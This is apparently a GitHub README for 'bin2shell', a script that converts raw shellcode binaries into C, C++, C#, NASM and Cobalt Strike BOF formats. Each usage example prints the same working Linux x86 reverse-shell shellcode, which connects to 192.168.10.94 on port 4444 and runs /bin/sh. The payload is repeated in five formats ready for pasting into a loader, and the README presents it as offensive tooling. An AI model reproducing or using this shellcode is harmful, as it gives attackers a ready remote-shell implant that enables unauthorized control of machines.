<div align="right">
  <a href="https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2Fbin2shell">
    <img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fl0n3m4n%2Fbin2shell&label=Visitors&countColor=%2337d67a" />
  </a>
</div>

# 🐚 bin2shell

## 📜 Description
A small script that generate shellcode from various low level languages. 

📚 Table of Contents
- 📜 [Description](#-description)
- ⚙️ [Help](#-help)
- 📌 [Author](#-author)
- 👨🏾‍⚖️ [License](#-license)

## ⚙️ Help
```bash
python3 bin2shell.py -h
  
  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
      Author: @l0n3m4n / Shellcode Generator / v1.2

usage: bin2shell.py [-h] -bin BIN [-c C] [-cpp CPP] [-cs CS] [-asm ASM]

Shellcode Generator (C,C#,CPP,ASM)

options:
  -h, --help  show this help message and exit
  -bin  BIN   Input shellcode binary file
  -c    C     Convert binart into C raw shellcode
  -cpp  CPP   Convert binary into CPP raw shellcode
  -cs   CS    Convert binary into C# raw shellcode
  -asm  ASM   Convert binary into (NASM) raw shellcode
  -bof  BOF   Convert cobalt strike BOF into raw shellcode

Example usage: python3 bin2shell.py -bin shellcode.bin -c shellcode_c.txt
```
## Usage
### Binary payload to C shellcode 
```bash
$ python3 bin2shell.py -bin shellcode.bin -c shellcode_c.txt

  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
      Author: @l0n3m4n / Shellcode Generator / v1.2


Formatted C Shellcode:

"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" 
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x0a\x5e\x68" 
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1" 
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3" 
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

Saved C formatted shellcode to shellcode_c.txt
```
### Binary payload to C++ shellcode
```bash
$ python3 bin2shell.py -bin shellcode.bin -cpp shell.txt

  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
       Author: @l0n3m4n / Shellcode Generator / v1.2 

Formatted C++ Shellcode:

const char shellcode[] = {0x31,0xdb,0xf7,0xe3,0x53,0x43,0x53,0x6a,0x02,0x89,0xe1,0xb0,0x66,0xcd,0x80,0x93,0x59,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf9,0x68,0xc0,0xa8,0x0a,0x5e,0x68,0x02,0x00,0x11,0x5c,0x89,0xe1,0xb0,0x66,0x50,0x51,0x53,0xb3,0x03,0x89,0xe1,0xcd,0x80,0x52,0x68,0x6e,0x2f,0x73,0x68,0x68,0x2f,0x2f,0x62,0x69,0x89,0xe3,0x52,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80};

Saved C++ formatted shellcode to shell.txt
```
### Binary payload to C# shellcode
```bash
$ python3 bin2shell.py -bin shellcode.bin -cs shell.txt

  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
       Author: @l0n3m4n / Shellcode Generator / v1.2 

Formatted C# Shellcode:

byte[] shellcode = new byte[] {0x31,0xdb,0xf7,0xe3,0x53,0x43,0x53,0x6a,0x02,0x89,0xe1,0xb0,0x66,0xcd,0x80,0x93,0x59,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf9,0x68,0xc0,0xa8,0x0a,0x5e,0x68,0x02,0x00,0x11,0x5c,0x89,0xe1,0xb0,0x66,0x50,0x51,0x53,0xb3,0x03,0x89,0xe1,0xcd,0x80,0x52,0x68,0x6e,0x2f,0x73,0x68,0x68,0x2f,0x2f,0x62,0x69,0x89,0xe3,0x52,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80};

Saved C# formatted shellcode to shell.txt
```
### Binary BOF loader to shellcode 
```bash
$ python3 bin2shell.py -bin shellcode.bin -bof shell.txt

  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
       Author: @l0n3m4n / Shellcode Generator / v1.2 

Formatted BOF Loader Shellcode:

31dbf7e35343536a0289e1b066cd809359b03fcd804979f968c0a80a5e680200115c89e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd801c3fe6e948000000

Saved BOF Loader formatted shellcode to shell.txt
```
### Binary payload to ASM shellcode
```bash
$ python3 bin2shell.py -bin shellcode.bin -asm shell.txt

  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
       Author: @l0n3m4n / Shellcode Generator / v1.2 

Formatted ASM Shellcode:

section .text
global _start

_start:
        jmp shellcode

shellcode:
        db 0x31
        db 0xdb
        db 0xf7
        db 0xe3
        db 0x53
        db 0x43
        db 0x53
        db 0x6a
        db 0x02
        db 0x89
        db 0xe1
        db 0xb0
        db 0x66
        db 0xcd
        db 0x80
        db 0x93
        db 0x59
        db 0xb0
        db 0x3f
        db 0xcd
        db 0x80
        db 0x49
        db 0x79
        db 0xf9
        db 0x68
        db 0xc0
        db 0xa8
        db 0x0a
        db 0x5e
        db 0x68
        db 0x02
        db 0x00
        db 0x11
        db 0x5c
        db 0x89
        db 0xe1
        db 0xb0
        db 0x66
        db 0x50
        db 0x51
        db 0x53
        db 0xb3
        db 0x03
        db 0x89
        db 0xe1
        db 0xcd
        db 0x80
        db 0x52
        db 0x68
        db 0x6e
        db 0x2f
        db 0x73
        db 0x68
        db 0x68
        db 0x2f
        db 0x2f
        db 0x62
        db 0x69
        db 0x89
        db 0xe3
        db 0x52
        db 0x53
        db 0x89
        db 0xe1
        db 0xb0
        db 0x0b
        db 0xcd
        db 0x80

Saved ASM formatted shellcode to shell.txt
``` 
## 📌 Author
- [Facebook](https://facebook.com/l0n3m4n)
- [Twitter (X)](https://twitter.com/l0n3m4n)
- [Medium](https://medium.com/l0n3m4n)
- [Website](https://l0n3m4n.github.io)

## 👨🏾‍⚖️ License
This project is under terms of the [MIT License](LICENSE). For fixing Bugs, create [issue](https://github.com/l0n3m4n/bin2shell/issues/new)
